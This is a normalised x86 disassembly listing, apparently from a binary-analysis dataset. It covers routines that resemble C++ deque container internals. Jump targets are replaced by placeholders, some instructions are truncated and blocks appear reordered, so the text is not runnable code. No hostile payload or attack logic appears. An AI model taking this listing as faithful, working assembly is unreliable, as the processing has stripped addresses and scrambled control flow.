push [ eax ]
call sub_1002004f
pop ecx
push [ esi ]
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] ebx
call sub_1002004f
pop ecx
pop esi
pop ebx
retn
push eax
call sub_1002004f
pop ecx
sub_1000f3ef
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ecx
mov eax [ ebp + 0x10 ]
push ebx
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x14 ]
push esi
xor ebx ebx
inc ebx
lea esi [ esp + 0x8 ]
mov [ esp + 0xc ] eax
call sub_1000f5e6
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1000f49d
mov eax [ ebp + 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_1000f434
push esi
mov esi eax
mov eax [ esi ]
push edi
mov edi [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ eax ]
jmp r-xdata
call sub_1002059f
mov eax [ esi ]
test eax eax
je r-xdata
test eax eax
je r-xdata
xor ecx ecx
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov esi [ esi ]
test esi esi
je r-xdata
call sub_1002059f
mov eax [ eax + 0x1c ]
add eax [ ecx + 0x18 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
xor eax eax
mov eax [ esi ]
jmp r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp [ eax + 0x14 ] edi
ja r-xdata
xor esi esi
mov esi [ esi ]
jmp r-xdata
xor eax eax
mov eax [ esi ]
jmp r-xdata
mov eax [ esi + 0x10 ]
mov eax [ eax + edi * 4 ]
pop edi
pop esi
retn
sub edi [ eax + 0x14 ]
sub_1000f49d
push ebp
mov ebp esp
sub esp 0x28
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov esi eax
lea edi [ ebp - 0x20 ]
call sub_1000f5c0
mov ebx [ ebp + 0x18 ]
lea edi [ ebp - 0x18 ]
call sub_1000f5c0
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x10 ]
call sub_1000f5c0
mov ebx [ ebp - 0x20 ]
test ebx ebx
je r-xdata
call sub_1002059f
cmp ebx [ ebp - 0x10 ]
je r-xdata
call sub_1002059f
cmp [ ebp - 0x18 ] ebx
je r-xdata
mov edi [ ebp - 0x1c ]
mov eax edi
sub eax [ ebp - 0xc ]
cmp [ ebp - 0xc ] edi
cmp [ ebp - 0x18 ] 0x0
mov [ ebp - 0xc ] eax
je r-xdata
call sub_1002059f
cmp eax [ ebp - 0x18 ]
je r-xdata
mov ebx [ esi + 0x1c ]
mov eax [ ebp - 0x14 ]
add ebx [ esi + 0x18 ]
sub eax edi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x8 ] eax
call sub_1000f5c0
mov eax [ ebp - 0x28 ]
test eax eax
je r-xdata
mov ebx [ esi + 0x1c ]
add ebx [ esi + 0x18 ]
call sub_1000f5c0
push [ ebp - 0x1c ]
lea eax [ ebp - 0x28 ]
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push eax
call sub_1000fd37
add esp 0x1c
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
mov ebx [ esi + 0x18 ]
call sub_1000f5c0
push [ ebp - 0x14 ]
lea eax [ ebp - 0x28 ]
push [ ebp - 0x18 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push eax
call sub_1000fce2
add esp 0x1c
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x14 ]
lea edi [ ebp - 0x28 ]
cmp [ ebp - 0xc ] eax
jae r-xdata
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x28 ]
call sub_1000f5c0
mov ebx [ ebp - 0xc ]
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x28 ]
call sub_1000f726
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0x14
call sub_1000f6f6
dec [ ebp - 0x8 ]
jne r-xdata
call sub_1000f6c5
dec [ ebp - 0x8 ]
jne r-xdata
jmp r-xdata
sub_1000f5c0
and [ edi ] 0x0
test esi esi
je r-xdata
call sub_1002059f
mov eax [ esi + 0x18 ]
cmp eax ebx
ja r-xdata
mov ecx [ esi + 0x1c ]
add ecx eax
cmp ebx ecx
jbe r-xdata
mov eax [ esi ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov eax edi
retn
sub_1000f5e6
mov eax [ esi ]
push edi
test eax eax
jne r-xdata
mov edi [ eax ]
jmp r-xdata
call sub_1002059f
mov eax [ esi ]
test eax eax
je r-xdata
test eax eax
je r-xdata
xor edi edi
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
call sub_1002059f
test eax eax
je r-xdata
mov ecx [ ecx + 0x1c ]
mov edx [ esi + 0x4 ]
add ecx [ edi + 0x18 ]
add edx ebx
pop edi
cmp edx ecx
ja r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
add [ esi + 0x4 ] ebx
mov eax esi
retn
cmp edx [ eax + 0x18 ]
jae r-xdata
sub_1000f632
push 0x1c
mov eax sub_10049e2e
call sub_10023e33
mov esi ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x1c ]
cmp [ ebp + 0x8 ] eax
jbe r-xdata
jae r-xdata
mov ebx [ esi + 0x18 ]
add ebx eax
lea edi [ ebp - 0x18 ]
call sub_1000f5c0
push [ ebp - 0x14 ]
lea eax [ ebp + 0xc ]
push [ ebp - 0x18 ]
mov ecx esi
push eax
mov eax [ ebp + 0x8 ]
sub eax [ esi + 0x1c ]
push eax
call sub_1000f74f
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp + 0xc ]
call sub_10002597
call sub_10023f0b
retn 0x20
mov ebx [ esi + 0x18 ]
add ebx eax
lea edi [ ebp - 0x18 ]
call sub_1000f5c0
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x20 ]
call sub_1000f5c0
mov ebx [ ebp + 0x8 ]
lea edi [ ebp - 0x28 ]
lea eax [ ebp - 0x20 ]
call sub_1000f726
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x20 ]
push eax
mov eax esi
call sub_1000f49d
sub_1000f6c5
cmp [ esi + 0x1c ] 0x0
je r-xdata
retn
mov eax [ esi + 0x18 ]
mov ecx [ esi + 0x10 ]
mov ecx [ ecx + eax * 4 ]
push 0x0
push 0x1
call sub_10002597
inc [ esi + 0x18 ]
mov eax [ esi + 0x18 ]
cmp [ esi + 0x14 ] eax
ja r-xdata
dec [ esi + 0x1c ]
jne r-xdata
and [ esi + 0x18 ] 0x0
and [ esi + 0x18 ] 0x0
sub_1000f6f6
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
retn
mov ecx [ esi + 0x18 ]
lea eax [ eax + ecx - 0x1 ]
mov ecx [ esi + 0x14 ]
cmp ecx eax
ja r-xdata
mov ecx [ esi + 0x10 ]
mov ecx [ ecx + eax * 4 ]
push 0x0
push 0x1
call sub_10002597
dec [ esi + 0x1c ]
jne r-xdata
sub eax ecx
and [ esi + 0x18 ] 0x0
sub_1000f726
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push esi
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
call sub_1000f5e6
mov eax [ ebp - 0x8 ]
mov [ edi ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop esi
leave
retn
sub_1000f74f
push 0x7c
mov eax sub_10049625
call sub_10023ed2
mov eax [ ebp + 0xc ]
mov esi ecx
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x7c ]
mov [ ebp - 0x80 ] esi
mov [ ebp - 0x70 ] eax
call sub_1000f5c0
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_1002059f
cmp eax [ ebp - 0x7c ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x3
cmp edi eax
jae r-xdata
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0x14 ]
sub eax [ ebp - 0x78 ]
mov [ ebp - 0x5c ] eax
mov eax [ esi + 0x1c ]
mov ebx [ ebp - 0x5c ]
mov edi eax
sub edi ebx
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x78 ] eax
cmp ebx edi
jae r-xdata
and [ ebp - 0x54 ] 0x0
sub eax edi
mov ebx eax
mov [ ebp - 0x54 ] edi
sub edi ebx
call sub_1000f5c0
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1000f726
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp - 0x70 ]
mov [ ebp - 0x58 ] ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x54 ] eax
call sub_100020c6
mov [ ebp - 0x4 ] 0x4
mov ebx [ ebp - 0x60 ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x58 ]
call sub_1000f726
mov esi eax
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x58 ]
call sub_1000f726
mov ebx [ ebp + 0x8 ]
mov edx ebx
lea edi [ ebp - 0x64 ]
call sub_1000fb4f
push [ esi + 0x4 ]
push [ esi ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push eax
call sub_1000fce2
add esp 0x1c
lea edi [ ebp - 0x74 ]
lea eax [ ebp - 0x58 ]
call sub_1000f726
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push eax
call sub_1000fd8c
lea ecx [ ebp - 0x50 ]
call sub_1000f5c0
mov ebx [ ebp - 0x54 ]
sub ebx [ ebp + 0x8 ]
lea edi [ ebp - 0x88 ]
add ebx [ ebp - 0x60 ]
lea eax [ ebp - 0x6c ]
add ebx [ ebp - 0x5c ]
call sub_1000f726
call sub_1000f434
push eax
mov eax esi
call sub_1000fafb
inc [ ebp - 0x54 ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x54 ] 0x0
push [ ebp - 0x70 ]
mov eax esi
call sub_1000fafb
dec ebx
jmp r-xdata
call sub_1000f726
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp - 0x70 ]
mov [ ebp - 0x58 ] ecx
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x54 ] eax
call sub_100020c6
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000f726
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x60 ] eax
lea edi [ ebp - 0x74 ]
lea eax [ ebp - 0x58 ]
call sub_1000f726
push [ ebp - 0x54 ]
mov ecx [ ebp - 0x60 ]
push [ ebp - 0x58 ]
push [ ecx + 0x4 ]
push [ ecx ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
call sub_1000fd37
mov ebx [ esi + 0x18 ]
add esp 0x1c
lea edi [ ebp - 0x64 ]
call sub_1000f5c0
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x58 ]
call sub_1000f726
mov esi eax
lea edi [ ebp - 0x74 ]
lea eax [ ebp - 0x64 ]
call sub_1000f726
push [ esi + 0x4 ]
push [ esi ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x34 ]
push eax
call sub_1000fd8c
lea ecx [ ebp - 0x34 ]
jmp r-xdata
dec ebx
call sub_1000f726
call sub_1000f434
push eax
mov eax esi
call sub_1000faad
dec [ ebp - 0x54 ]
jmp r-xdata
mov [ ebp - 0x54 ] ebx
push [ ebp - 0x70 ]
mov eax esi
call sub_1000faad
dec edi
jmp r-xdata
call sub_10023f2e
retn 0x10
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x6c ]
cmp [ ebp - 0x54 ] eax
jae r-xdata
call sub_1000f5c0
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1000f726
mov ebx [ ebp - 0x60 ]
lea edi [ ebp - 0x88 ]
jmp r-xdata
call sub_1000f5c0
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x54 ]
lea ebx [ ecx + eax ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1000f726
call sub_1000f434
push eax
mov eax esi
call sub_1000fafb
inc [ ebp - 0x54 ]
mov edi [ ebp - 0x60 ]
jmp r-xdata
test ebx ebx
jbe r-xdata
add esp 0x14
push 0x0
push 0x1
call sub_10002597
jmp r-xdata
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x64 ]
call sub_1000f5c0
cmp [ ebp - 0x54 ] 0x0
mov ebx [ ebp + 0x8 ]
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x64 ]
jbe r-xdata
call sub_1000f726
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x6c ]
dec ebx
call sub_1000f726
call sub_1000f434
push eax
mov eax esi
call sub_1000faad
dec [ ebp - 0x54 ]
jmp r-xdata
test edi edi
jbe r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x54 ] eax
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x58 ] esi
call sub_1000f726
push [ eax + 0x4 ]
push [ eax ]
push [ ebp - 0x54 ]
push esi
push [ ebp - 0x70 ]
call sub_1000fd8c
add esp 0x14
cmp [ ebp - 0x54 ] edi
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x6c ]
jae r-xdata
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x64 ]
call sub_1000f5c0
cmp [ ebp - 0x54 ] 0x0
mov ebx [ ebp + 0x8 ]
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x64 ]
jbe r-xdata
sub_1000f907
mov esi [ ebp - 0x80 ]
mov edi [ ebp - 0x78 ]
jmp r-xdata
cmp edi [ esi + 0x1c ]
jb r-xdata
call sub_1000f6c5
push 0x0
push 0x0
call sub_10023a01
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x3
cmp edi eax
jae r-xdata
and [ ebp - 0x54 ] 0x0
sub eax edi
mov ebx eax
call sub_1000f5c0
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1000f726
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp - 0x70 ]
mov [ ebp - 0x58 ] ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x54 ] eax
call sub_100020c6
mov [ ebp - 0x4 ] 0x4
mov ebx [ ebp - 0x60 ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x58 ]
call sub_1000f726
mov esi eax
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x58 ]
call sub_1000f726
mov ebx [ ebp + 0x8 ]
mov edx ebx
lea edi [ ebp - 0x64 ]
call sub_1000fb4f
push [ esi + 0x4 ]
push [ esi ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push eax
call sub_1000fce2
add esp 0x1c
lea edi [ ebp - 0x74 ]
lea eax [ ebp - 0x58 ]
call sub_1000f726
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push eax
call sub_1000fd8c
lea ecx [ ebp - 0x50 ]
add esp 0x14
push 0x0
push 0x1
call sub_10002597
jmp r-xdata
call sub_1000f5c0
mov ebx [ ebp - 0x54 ]
sub ebx [ ebp + 0x8 ]
lea edi [ ebp - 0x88 ]
add ebx [ ebp - 0x60 ]
lea eax [ ebp - 0x6c ]
add ebx [ ebp - 0x5c ]
call sub_1000f726
call sub_1000f434
push eax
mov eax esi
call sub_1000fafb
inc [ ebp - 0x54 ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x54 ] 0x0
push [ ebp - 0x70 ]
mov eax esi
call sub_1000fafb
dec ebx
jmp r-xdata
call sub_10023f2e
retn 0x10
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x6c ]
cmp [ ebp - 0x54 ] eax
jae r-xdata
call sub_1000f5c0
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1000f726
mov ebx [ ebp - 0x60 ]
lea edi [ ebp - 0x88 ]
jmp r-xdata
call sub_1000f5c0
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x54 ]
lea ebx [ ecx + eax ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1000f726
call sub_1000f434
push eax
mov eax esi
call sub_1000fafb
inc [ ebp - 0x54 ]
mov edi [ ebp - 0x60 ]
jmp r-xdata
test ebx ebx
jbe r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x54 ] eax
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x58 ] esi
call sub_1000f726
push [ eax + 0x4 ]
push [ eax ]
push [ ebp - 0x54 ]
push esi
push [ ebp - 0x70 ]
call sub_1000fd8c
add esp 0x14
cmp [ ebp - 0x54 ] edi
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x6c ]
jae r-xdata
sub_1000fa96
mov esi [ ebp - 0x80 ]
mov edi [ ebp - 0x78 ]
jmp r-xdata
cmp edi [ esi + 0x1c ]
jb r-xdata
call sub_1000f6f6
jmp r-xdata
push 0x0
push 0x0
call sub_10023a01
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x3
cmp edi eax
jae r-xdata
and [ ebp - 0x54 ] 0x0
sub eax edi
mov ebx eax
call sub_1000f5c0
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1000f726
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp - 0x70 ]
mov [ ebp - 0x58 ] ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x54 ] eax
call sub_100020c6
mov [ ebp - 0x4 ] 0x4
mov ebx [ ebp - 0x60 ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x58 ]
call sub_1000f726
mov esi eax
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x58 ]
call sub_1000f726
mov ebx [ ebp + 0x8 ]
mov edx ebx
lea edi [ ebp - 0x64 ]
call sub_1000fb4f
push [ esi + 0x4 ]
push [ esi ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push eax
call sub_1000fce2
add esp 0x1c
lea edi [ ebp - 0x74 ]
lea eax [ ebp - 0x58 ]
call sub_1000f726
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push eax
call sub_1000fd8c
lea ecx [ ebp - 0x50 ]
add esp 0x14
push 0x0
push 0x1
call sub_10002597
jmp r-xdata
call sub_1000f5c0
mov ebx [ ebp - 0x54 ]
sub ebx [ ebp + 0x8 ]
lea edi [ ebp - 0x88 ]
add ebx [ ebp - 0x60 ]
lea eax [ ebp - 0x6c ]
add ebx [ ebp - 0x5c ]
call sub_1000f726
call sub_1000f434
push eax
mov eax esi
call sub_1000fafb
inc [ ebp - 0x54 ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x54 ] 0x0
push [ ebp - 0x70 ]
mov eax esi
call sub_1000fafb
dec ebx
jmp r-xdata
call sub_10023f2e
retn 0x10
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x6c ]
cmp [ ebp - 0x54 ] eax
jae r-xdata
call sub_1000f5c0
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1000f726
mov ebx [ ebp - 0x60 ]
lea edi [ ebp - 0x88 ]
jmp r-xdata
call sub_1000f5c0
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x54 ]
lea ebx [ ecx + eax ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1000f726
call sub_1000f434
push eax
mov eax esi
call sub_1000fafb
inc [ ebp - 0x54 ]
mov edi [ ebp - 0x60 ]
jmp r-xdata
test ebx ebx
jbe r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x54 ] eax
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x58 ] esi
call sub_1000f726
push [ eax + 0x4 ]
push [ eax ]
push [ ebp - 0x54 ]
push esi
push [ ebp - 0x70 ]
call sub_1000fd8c
add esp 0x14
cmp [ ebp - 0x54 ] edi
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x6c ]
jae r-xdata
sub_1000faad
push esi
mov esi eax
mov eax [ esi + 0x1c ]
inc eax
push edi
cmp [ esi + 0x14 ] eax
ja r-xdata
mov edi [ esi + 0x18 ]
test edi edi
jne r-xdata
call sub_1000fb7e
mov eax [ esi + 0x10 ]
dec edi
cmp [ eax + edi * 4 ] 0x0
jne r-xdata
mov edi [ esi + 0x14 ]
mov eax [ esi + 0x10 ]
push [ esp + 0xc ]
mov ecx [ eax + edi * 4 ]
call sub_10001a13
inc [ esi + 0x1c ]
mov [ esi + 0x18 ] edi
pop edi
pop esi
retn 0x4
xor ecx ecx
inc ecx
call sub_100018bf
mov ecx [ esi + 0x10 ]
mov [ ecx + edi * 4 ] eax
sub_1000fafb
push esi
mov esi eax
mov eax [ esi + 0x1c ]
inc eax
push edi
cmp [ esi + 0x14 ] eax
ja r-xdata
mov eax [ esi + 0x18 ]
add eax [ esi + 0x1c ]
mov ecx [ esi + 0x14 ]
cmp ecx eax
ja r-xdata
call sub_1000fb7e
mov edi eax
mov eax [ esi + 0x10 ]
shl edi 0x2
cmp [ edi + eax ] 0x0
jne r-xdata
sub eax ecx
mov eax [ esi + 0x10 ]
push [ esp + 0xc ]
mov ecx [ eax + edi ]
call sub_10001a13
inc [ esi + 0x1c ]
pop edi
pop esi
retn 0x4
xor ecx ecx
inc ecx
call sub_100018bf
mov ecx [ esi + 0x10 ]
mov [ edi + ecx ] eax
sub_1000fb4f
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push ebx
mov ebx edx
push esi
neg ebx
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
call sub_1000f5e6
mov eax [ ebp - 0x8 ]
mov [ edi ] eax
mov eax [ ebp - 0x4 ]
pop esi
mov [ edi + 0x4 ] eax
mov eax edi
pop ebx
leave
retn
sub_1000fb7e
push ebp
mov ebp esp
mov eax [ esi + 0x14 ]
sub esp 0x10
push ebx
mov edx 0x9249249
xor ebx ebx
mov ecx edx
inc ebx
sub ecx eax
push edi
cmp ecx ebx
jae r-xdata
mov ecx eax
shr ecx 0x1
cmp ecx 0x8
jae r-xdata
call sub_1000fc57
cmp ecx ebx
jbe r-xdata
push 0x8
pop ecx
mov edi [ esi + 0x18 ]
lea ecx [ eax + ebx ]
mov [ ebp - 0x4 ] edi
call sub_1000fc96
mov ecx [ esi + 0x10 ]
shl edi 0x2
mov [ ebp - 0x8 ] eax
lea edx [ edi + eax ]
mov eax [ esi + 0x14 ]
lea eax [ ecx + eax * 4 ]
add ecx edi
push ecx
call sub_1000fdd1
pop ecx
mov ecx [ esi + 0x10 ]
mov edx eax
push ecx
cmp [ ebp - 0x4 ] ebx
ja r-xdata
sub edx ecx
cmp eax edx
ja r-xdata
lea eax [ ecx + ebx * 4 ]
call sub_1000fdd1
mov edx [ ebp - 0x8 ]
pop ecx
mov ecx [ esi + 0x10 ]
lea eax [ ecx + edi ]
lea ecx [ ecx + ebx * 4 ]
push ecx
call sub_1000fdd1
pop ecx
mov edi eax
test ebx ebx
jbe r-xdata
mov eax ebx
sub eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea eax [ ecx + edi ]
call sub_1000fdd1
pop ecx
mov ecx [ ebp - 0xc ]
mov edi eax
test ecx ecx
jbe r-xdata
mov ebx ecx
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov ecx ebx
mov ecx [ ebp - 0x4 ]
test ecx ecx
jbe r-xdata
xor eax eax
[ edi ]
mov eax [ ebp - 0x8 ]
add [ esi + 0x14 ] ebx
pop edi
mov [ esi + 0x10 ] eax
pop ebx
leave
retn
push eax
call sub_1002004f
pop ecx
mov edi [ ebp - 0x8 ]
jmp r-xdata
xor eax eax
[ edi ]
sub_1000fc57
push 0x44
mov eax sub_10048fcb
call sub_10023e33
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_10001be4
push r--data
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x50 ] r--data
call sub_10023a01
int3
sub_1000fc96
push ebp
mov ebp esp
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x4
jae r-xdata
xor ecx ecx
mov eax ecx
shl eax 0x2
push eax
call sub_10020186
pop ecx
leave
retn
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_100201fc
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_10023a01
int3
sub_1000fce2
push ebp
mov ebp esp
push ecx
push esi
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov edx [ eax ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x18 ]
test eax eax
je r-xdata
push [ ebp + 0x20 ]
mov ecx [ ebp + 0x10 ]
push [ ebp + 0x1c ]
mov eax [ eax ]
push esi
push edx
push ecx
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_1000fdf8
mov eax [ ebp + 0x8 ]
add esp 0x28
pop edi
pop esi
leave
retn
sub_1000fd37
push ebp
mov ebp esp
push ecx
push esi
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov edx [ eax ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x18 ]
test eax eax
je r-xdata
push [ ebp + 0x20 ]
mov ecx [ ebp + 0x10 ]
push [ ebp + 0x1c ]
mov eax [ eax ]
push esi
push edx
push ecx
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_1000fe71
mov eax [ ebp + 0x8 ]
add esp 0x28
pop edi
pop esi
leave
retn
sub_1000fd8c
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x10
push esi
mov esi [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
pop esi
leave
retn
lea eax [ ebp - 0xc ]
call sub_1000f434
push 0xffffffff
push 0x0
push [ ebp + 0x8 ]
mov ecx eax
call sub_10002033
inc [ ebp - 0x8 ]
jmp r-xdata
mov eax [ eax ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x8 ] esi
je r-xdata
sub_1000fdd1
sub eax [ esp + 0x4 ]
push esi
sar eax 0x2
mov ecx eax
shl ecx 0x2
lea esi [ ecx + edx ]
test eax eax
jbe r-xdata
mov eax esi
pop esi
retn
push ecx
push [ esp + 0xc ]
push ecx
push edx
call sub_100203cb
add esp 0x10
sub_1000fdf8
push ebp
mov ebp esp
mov eax [ ebp + 0x24 ]
sub eax [ ebp + 0x1c ]
sub esp 0x1c
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov edx eax
lea eax [ ebp + 0x28 ]
call sub_1000fb4f
mov eax [ ebp + 0x28 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
dec esi
dec [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] esi
call sub_1000f434
mov ebx eax
lea eax [ ebp - 0x8 ]
call sub_1000f434
push 0xffffffff
push 0x0
push ebx
mov ecx eax
call sub_10002033
jmp r-xdata
mov eax [ eax ]
mov ecx [ ebp + 0x2c ]
mov esi [ ebp + 0x24 ]
mov edi [ ebp + 0x1c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x4 ] ecx
